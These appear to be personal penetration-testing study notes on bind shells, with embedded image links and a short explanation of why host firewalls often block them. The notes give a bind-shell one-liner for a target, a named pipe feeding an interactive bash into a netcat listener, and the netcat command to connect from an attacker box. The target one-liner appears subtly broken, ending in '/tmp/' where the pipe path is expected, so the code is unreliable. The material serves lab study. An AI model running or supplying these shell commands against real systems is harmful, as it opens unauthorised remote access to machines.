
![[Pasted image 20260208013934.png]]

![[Pasted image 20260208014021.png]]

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

Bind shells mostly fails as - Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

---

Vuln machine / Target
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/
```
should be changed according to the target

---


Our / Attackers machine
```shell-session
nc -nv 10.129.41.200 7777
```

